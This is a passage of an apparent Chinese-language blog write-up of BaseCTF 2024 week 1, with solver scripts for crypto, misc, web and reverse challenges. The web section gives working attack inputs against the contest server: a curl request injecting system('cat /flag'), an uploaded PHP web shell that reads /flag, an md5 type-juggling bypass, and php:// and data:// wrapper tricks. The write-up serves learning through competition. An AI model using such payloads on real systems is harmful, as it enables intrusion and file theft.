class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f, <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;galf.jpg&quot;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> d:<br>    data = f.read()<br>    d.write(<span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">reversed</span>(data))))<br></code></pre></td></tr></table></figure><p><code>binwalk</code> 查一下文件，发现 <code>flag.txt</code>和一个压缩包，以为是个假的，压缩包解压出来也是，那就交了吧。</p><h3 id="base">Base</h3><p>后面6个等于号，大概是 Base 编码系列但是不是Base64。分析一下编码结果，发现只有大写字母和一些数字，那么大概率是Base32 了，解一下发现好像是 Base64，再解一下就<ahref="https://gchq.github.io/CyberChef/#recipe=From_Base32(&#39;A-Z2-7%3D&#39;,true)From_Base64(&#39;A-Za-z0-9%2B/%3D&#39;,true,false)&amp;input=S0ZXVU02UzJLVkhGS1VUT09RWlZVVkNHTkpHVU9NTE1MQVpWRTVTWUdKRVRBWVpTS1pWR0lSMjJIRT09PT09PQ">flag</a>了。</p><h3 id="人生苦短我用python">人生苦短，我用Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> accumulate, product<br><br>n = <span class="hljs-number">38</span><br>ind = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(n))<br>flag = [<span class="hljs-string">&#x27; &#x27;</span>]*n<br><br><span class="hljs-keyword">for</span> i, c <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-string">&quot;BaseCTF&#123;&quot;</span>):<br>    flag[i] = c<br><br>flag[<span class="hljs-number">10</span>:<span class="hljs-number">12</span>] = <span class="hljs-built_in">list</span>(<span class="hljs-string">&quot;Mp&quot;</span>)<br><br>flag[-<span class="hljs-number">3</span>:] = <span class="hljs-built_in">list</span>(<span class="hljs-string">&quot;3x&#125;&quot;</span>)<br><br>flag[-<span class="hljs-number">1</span>] = <span class="hljs-built_in">chr</span>(<span class="hljs-number">125</span>)<br><br><span class="hljs-keyword">for</span> i, ind <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(accumulate([<span class="hljs-number">14</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>][:-<span class="hljs-number">1</span>])):<br>    flag[i+ind] = <span class="hljs-string">&#x27;_&#x27;</span><br><span class="hljs-comment"># assert list(map(len, &quot;&quot;.join(flag).split(&#x27;_&#x27;))) == [14, 2, 6, 4, 8], str(list(map(len, &quot;&quot;.join(flag).split(&#x27;_&#x27;))))</span><br><br>flag[<span class="hljs-number">12</span>:<span class="hljs-number">32</span>:<span class="hljs-number">4</span>] = <span class="hljs-built_in">list</span>(<span class="hljs-string">&quot;lsT_n&quot;</span>)<br><br><span class="hljs-comment"># flag[8] = &#x27;S&#x27;</span><br>flag[<span class="hljs-number">8</span>] = <span class="hljs-string">&#x27;s&#x27;</span><br><br>flag[-<span class="hljs-number">11</span>] = <span class="hljs-string">&#x27;4&#x27;</span><br><br>flag[-<span class="hljs-number">7</span>:-<span class="hljs-number">3</span>] = <span class="hljs-built_in">list</span>(base64.b64decode(<span class="hljs-string">&#x27;MG1QbA==&#x27;</span>).decode())<br><br>flag[::-<span class="hljs-number">7</span>] = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;7d4372733173&quot;</span>).decode())<br><br><span class="hljs-comment"># set(flag[12::11]) == &#123;&#x27;l&#x27;, &#x27;r&#x27;&#125;</span><br><br>flag[<span class="hljs-number">21</span>:<span class="hljs-number">27</span>] = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">bytes</span>([<span class="hljs-number">116</span>, <span class="hljs-number">51</span>, <span class="hljs-number">114</span>, <span class="hljs-number">95</span>, <span class="hljs-number">84</span>, <span class="hljs-number">104</span>]).decode())<br><br><span class="hljs-keyword">for</span> _c <span class="hljs-keyword">in</span> product(string.printable, repeat=<span class="hljs-number">2</span>):<br>    _s = [flag[<span class="hljs-number">17</span>], *_c]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">ord</span>(c) * <span class="hljs-number">2024_08_15</span> ** idx <span class="hljs-keyword">for</span> idx, c <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(_s)) == <span class="hljs-number">41378751114180610</span>:<br>        flag[<span class="hljs-number">17</span>:<span class="hljs-number">20</span>] = _s<br>        <span class="hljs-keyword">break</span><br><br>flag[<span class="hljs-number">13</span>] = <span class="hljs-string">&#x27;3&#x27;</span><br>flag[<span class="hljs-number">15</span>] = <span class="hljs-string">&#x27;1&#x27;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(flag))<br></code></pre></td></tr></table></figure><h2 id="crypto">Crypto</h2><h3 id="ez_math">ez_math</h3><p>看来不是标准解，两个三角矩阵6个未知量加上 <spanclass="math inline">\(a, b, c, d\)</span> 与 <code>flag</code>5个共11个未知量，矩阵是9个等式，2个乘积2个等式，可以解出<code>flag</code>。用 sagemath 解。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs sagemath">R = matrix([[<br>    73595299897883318809385485549070133693240974831930302408429664709375267345973630251242462442287906226820558620868020093702204534513147710406187365838820773200509683489479230005270823245,<br>    46106113894293637419638880781044700751458754728940339402825975283562443072980134956975133603010158365617690455079648357103963721564427583836974868790823082218575195867647267322046726830,<br>    161159443444728507357705839523372181165265338895748546250868368998015829266587881868060439602487400399254839839711192069105943123376622497847079185,<br>], [<br>    13874395612510317401724273626815493897470313869776776437748145979913315379889260408106588331541371806148807844847909,<br>    17025249852164087827929313934411832021160463738288565876371918871371314930048841650464137478757581505369909723030523,<br>    59510107422473463833740668736202898422777415868238817665123293560097821015330,<br>], [<br>    11314088133820151155755028207579196628679021106024798818326096960197933616112389017957501267749946871903275867785729,<br>    13883500421020573457778249958402264688539607625195400103961001780695107955462968883861677871644577542226749179056659,<br>    48528427402189936709203219516777784993195743269405968907408051071264464132448,<br>]])<br><br>f, x1, y1, z1, x2, y2, z2 = var(&quot;f, x1, y1, z1, x2, y2, z2&quot;)<br><br>u = matrix([[1,x1,y1], [0,1,z1], [0,0,1]])<br>l = matrix([[1,0,0], [x2,1,0], [y2,z2,1]])<br>B = u*l<br><br>t1 = [292585039548930662326103829416538145189, 293124197879399252223245955841307374193, ]<br>t2 = [239032610975319686124167120759414114611, 294816936919419198311047310603595242713, ]<br>for a, d in [t1, reversed(t1)]:<br>    for b, c in [t2, reversed(t2)]:<br>        A = matrix([[f,0,0], [0,a,b], [0,c,d]])<br>        L = A*B<br>        eqs = []<br>        for i in range(3):<br>            for j in range(3):<br>                eqs.append(L[i][j] == R[i][j])<br>        ans = solve(eqs, f, x1, y1, z1, x2, y2, z2)<br>        if ans:<br>            print(ans)<br></code></pre></td></tr></table></figure><h3 id="babypack">babypack</h3><p><code>output.txt</code> 太大了，直接改名为<code>output.py</code>，原理尚不清楚，但是大概是因为每个比特的数字都大于低位比特数字之和，所以应该是不存在选择当前位与选择一些低位之和冲突。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> output <span class="hljs-keyword">import</span> *<br><br>bits = []<br>cc = c<br><span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> a:<br>    <span class="hljs-keyword">if</span> cc &gt;= b:<br>        bits.append(<span class="hljs-number">1</span>)<br>        cc -= b<br>    <span class="hljs-keyword">else</span>:<br>        bits.append(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>, bits)), base=<span class="hljs-number">2</span>)).decode())<br></code></pre></td></tr></table></figure><h3 id="babyrsa">babyrsa</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>n = <span class="hljs-number">104183228088542215832586853960545770129432455017084922666863784677429101830081296092160577385504119992684465370064078111180392569428724567004127219404823572026223436862745730173139986492602477713885542326870467400963852118869315846751389455454901156056052615838896369328997848311481063843872424140860836988323</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">82196463059676486575535008370915456813185183463924294571176174789532397479953946434034716719910791511862636560490018194366403813871056990901867869218620209108897605739690399997114809024111921392073218916312505618204406951839504667533298180440796183056408632017397568390899568498216649685642586091862054119832</span><br><br>d = gmpy2.invert(e, n-<span class="hljs-number">1</span>)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m).decode())<br></code></pre></td></tr></table></figure><h3 id="十七倍">十七倍</h3><p>17 = 0b10001，高4位减去低4位得到原始的高4位，注意也许要退位。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">cipher = [<br>    <span class="hljs-number">98</span>,  <span class="hljs-number">113</span>, <span class="hljs-number">163</span>, <span class="hljs-number">181</span>, <span class="hljs-number">115</span>, <span class="hljs-number">148</span>, <span class="hljs-number">166</span>,  <span class="hljs-number">43</span>,   <span class="hljs-number">9</span>,  <span class="hljs-number">95</span>,<br>    <span class="hljs-number">165</span>, <span class="hljs-number">146</span>,  <span class="hljs-number">79</span>, <span class="hljs-number">115</span>, <span class="hljs-number">146</span>, <span class="hljs-number">233</span>, <span class="hljs-number">112</span>, <span class="hljs-number">180</span>,  <span class="hljs-number">48</span>,  <span class="hljs-number">79</span>,<br>    <span class="hljs-number">65</span>,  <span class="hljs-number">181</span>, <span class="hljs-number">113</span>, <span class="hljs-number">146</span>,  <span class="hljs-number">46</span>, <span class="hljs-number">249</span>,  <span class="hljs-number">78</span>, <span class="hljs-number">183</span>,  <span class="hljs-number">79</span>, <span class="hljs-number">133</span>,<br>    <span class="hljs-number">180</span>, <span class="hljs-number">113</span>, <span class="hljs-number">146</span>, <span class="hljs-number">148</span>, <span class="hljs-number">163</span>,  <span class="hljs-number">79</span>,  <span class="hljs-number">78</span>,  <span class="hljs-number">48</span>, <span class="hljs-number">231</span>,  <span class="hljs-number">77</span>,<br>]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> c: <span class="hljs-built_in">chr</span>(((c+<span class="hljs-number">0x100</span>)-((c&amp;<span class="hljs-number">0xf</span>)&lt;&lt;<span class="hljs-number">4</span>))&amp;<span class="hljs-number">0x7f</span>), cipher)))<br></code></pre></td></tr></table></figure><h3 id="hellocrypto">helloCrypto</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><br>key1 = <span class="hljs-number">208797759953288399620324890930572736628</span><br>key = long_to_bytes(key1)<br><br>c = <span class="hljs-string">b&#x27;U\xcd\xf3\xb1 r\xa1\x8e\x88\x92Sf\x8a`Sk],\xa3(i\xcd\x11\xd0D\x1edd\x16[&amp;\x92@^\xfc\xa9(\xee\xfd\xfb\x07\x7f:\x9b\x88\xfe&#123;\xae&#x27;</span><br>my_ass = AES.new(key=key, mode=AES.MODE_ECB)<br><span class="hljs-built_in">print</span>(unpad(my_ass.decrypt(c), AES.block_size).decode())<br></code></pre></td></tr></table></figure><h3 id="ez_rsa">ez_rsa</h3><p><span class="math inline">\(\varphi(n) = (p-1)(q-1) = n - (p+q) +1\)</span>，<span class="math inline">\(\varphi&#39; = (p+2)(q+2) =n+2(p+q) + 4\)</span>，用 <spanclass="math inline">\(\varphi&#39;\)</span> 求出 <spanclass="math inline">\(p+q\)</span> 即可求出 <spanclass="math inline">\(\varphi(n)\)</span>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>n = <span class="hljs-number">96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790344897976690691139671461342896437428086142262969360560293350630096355947291129943172939923835317907954465556018515239228081131167407674558849860647237317421</span><br>not_phi = <span class="hljs-number">96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790384900615665394180812810697286554008262030049280213663390855887077502992804805794388166197820395507600028816810471093163466639673142482751115353389655533205</span><br>c = <span class="hljs-number">37077223015399348092851894372646658604740267343644217689655405286963638119001805842457783136228509659145024536105346167019011411567936952592106648947994192469223516127472421779354488529147931251709280386948262922098480060585438392212246591935850115718989480740299246709231437138646467532794139869741318202945</span><br>e = <span class="hljs-number">65537</span><br><br>p_q_add = (not_phi-n-<span class="hljs-number">4</span>)//<span class="hljs-number">2</span><br>phi = not_phi - <span class="hljs-number">3</span>*p_q_add - <span class="hljs-number">3</span><br>d = gmpy2.invert(e, phi)<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(c, d, n)).decode())<br></code></pre></td></tr></table></figure><h3 id="你会算md5吗">你会算md5吗</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> printable<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br>MAPPER = &#123;md5(c.encode()).hexdigest(): c <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> printable&#125;<br>output = [<br>    <span class="hljs-string">&#x27;9d5ed678fe57bcca610140957afab571&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <br>    <span class="hljs-string">&#x27;03c7c0ace395d80182db07ae2c30f034&#x27;</span>, <span class="hljs-string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>, <br>    <span class="hljs-string">&#x27;0d61f8370cad1d412f80b84d143e1257&#x27;</span>, <span class="hljs-string">&#x27;b9ece18c950afbfa6b0fdbfa4ff731d3&#x27;</span>, <br>    <span class="hljs-string">&#x27;800618943025315f869e4e1f09471012&#x27;</span>, <span class="hljs-string">&#x27;f95b70fdc3088560732a5ac135644506&#x27;</span>, <br>    <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <br>    <span class="hljs-string">&#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;</span>, <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>, <br>    <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <span class="hljs-string">&#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;</span>, <br>    <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;e4da3b7fbbce2345d7772b0674a318d5&#x27;</span>, <br>    <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>, <span class="hljs-string">&#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;</span>, <br>    <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>, <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>, <br>    <span class="hljs-string">&#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;</span>, <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>, <br>    <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <span class="hljs-string">&#x27;8f14e45fceea167a5a36dedd4bea2543&#x27;</span>, <br>    <span class="hljs-string">&#x27;1679091c5a880faf6fb5e6087eb1b2dc&#x27;</span>, <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <br>    <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>, <span class="hljs-string">&#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;</span>, <br>    <span class="hljs-string">&#x27;8277e0910d750195b448797616e091ad&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <br>    <span class="hljs-string">&#x27;c81e728d9d4c2f636f067f89cc14862c&#x27;</span>, <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>, <br>    <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>, <br>    <span class="hljs-string">&#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;</span>, <span class="hljs-string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>, <br>    <span class="hljs-string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>, <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <br>    <span class="hljs-string">&#x27;8277e0910d750195b448797616e091ad&#x27;</span>, <span class="hljs-string">&#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;</span>, <br>    <span class="hljs-string">&#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <br>    <span class="hljs-string">&#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <br>    <span class="hljs-string">&#x27;cbb184dd8e05c9709e5dcaedaa0495cf&#x27;</span><br>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> _md5: MAPPER[_md5], output)))<br></code></pre></td></tr></table></figure><h2 id="pwn">Pwn</h2><p>最差的一部分，得好好补补了。这部分只做了两题，会用 nc 会用基础的linux 命令即可，就不放在这里丢人现眼了。</p><h2 id="web">Web</h2><h3 id="http-是什么呀">HTTP 是什么呀</h3><p>正好练习一下 curl，最后所有都对了就是没输出，所以用<code>--verbose</code> 参数看一下到底发生了什么。发现是重定向了，而且flag 在 url 里面。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl &quot;http://challenge.basectf.fun:37388?basectf=we1c%2500me&quot; \<br>    --data Base=fl@g \<br>    --cookie c00k13=&quot;i can&#x27;t eat it&quot; \<br>    --header &quot;User-Agent:Base&quot; \<br>    --header &quot;Referer:Base&quot; \<br>    --header &quot;X-Forwarded-For:127.0.0.1&quot; \<br>    --verbose<br></code></pre></td></tr></table></figure><h3 id="喵喵喵ﻌ">喵喵喵´•ﻌ•`</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl &quot;http://challenge.basectf.fun:22840/?DT=system(%22cat%20/flag%22);&quot;<br></code></pre></td></tr></table></figure><h3 id="md5绕过欸">md5绕过欸</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl &quot;http://challenge.basectf.fun:35748?name=240610708&amp;name2[]=1&quot; \<br>    --data &quot;password=314282422&amp;password2[]=2&quot;<br></code></pre></td></tr></table></figure><h3 id="a-dark-room">A Dark Room</h3><p>F12</p><h3 id="upload">upload</h3><p>写如下的脚本并上传，然后访问<code>http://host:port/uploads/filename.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>很好奇为什么不能使用 <code>$_GET</code> 参数来执行<code>system</code> 命令</p></blockquote><h3 id="aura-酱的礼物">Aura 酱的礼物</h3><blockquote><p>感谢 <a href="https://vercel.com">Vercel</a> 的大力支持</p></blockquote><p>花了好久，最后歪门邪道搞出来了。</p><p>首先是读 <code>$_POST['pen']</code> 的文件，那么直接伪协议<code>data://text/plain;base64,QXVyYQ==</code> 绕过。</p><p>接着是要求 <code>$_POST['challenge']</code> 以<code>http://jasmineaura.github.io</code>开头，并且从该变量获得的内容中包含指定内容，做题的时候大概有以下2点思路：</p><ol type="1"><li>看看这个网站上有什么可以内容注入的点，比如说一般的博客在内容搜索的时候，加入内容不存在，会说“未找到xxx”，那不就包含了。（不知道静态网页能不能做，反正是审计的内容）</li><li>找 <code>strpos</code> 和 <code>get_file_contents</code>函数的漏洞绕过。</li></ol><p>发现没什么用，有 <code>search.js</code>文件但是没用，<code>strpos</code> 和 <code>get_file_contents</code>也是弱类型绕过，这里好像没用。</p><p>忽然灵光一闪，我可以用<code>http://jasmineaura.github.io.bcb.pub</code>解析到一个服务器上，返回指定内容就好啦。因为没有备案的服务器，所以 A解析在国内没用。正好前面搞了 CNAME解析，看看能不能搞一个服务器，或者只要静态网页托管就行了。</p><p>服务器这方面，Vultr 至少需要充 10 USD；Google Cloud没有信用卡不然可以白嫖。静态托管这方面，Github Page的话不想搞乱博客（其实在 Github 上也看到了一些为了解这题创建的项目，试图CNAME 蹭蹭但是失败），GitLab/Gitee 也都有部署/审核的麻烦。最后选择了Vercel 的服务，可以支持 CNAME。设置一下绕过判断。</p><img src="/2024/08/21/ctf/basectf2024/week1/web_cname.png" class="" title="CNAME 解析"><p>最后就是一个<code>php://filter/read=convert.base64-encode/resource=flag.php</code>带出信息。</p><h2 id="reverse">Reverse</h2><blockquote><p>感谢 <a href="https://www.52pojie.cn/">52pojie</a> 的资源</p></blockquote><h3 id="you-are-good-at-ida">You are good at IDA</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> var9[<span class="hljs-number">17</span>]; <span class="hljs-comment">// [rsp+27h] [rbp-9h] BYREF</span><br><br>  _main(argc, argv, envp);<br>  <span class="hljs-built_in">strcpy</span>(var9, <span class="hljs-string">&quot;Y0u_4Re_&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is the first part&quot;</span>);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">10</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, var9);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">10</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You can shift f12 look look&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Second</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is the second part&quot;</span>);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">57</span>);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">48</span>);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">48</span>);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">100</span>);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">95</span>);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">52</span>);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">55</span>);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">95</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Only the last part remains&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The last part is in a named Interesting&#x27;s func&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span 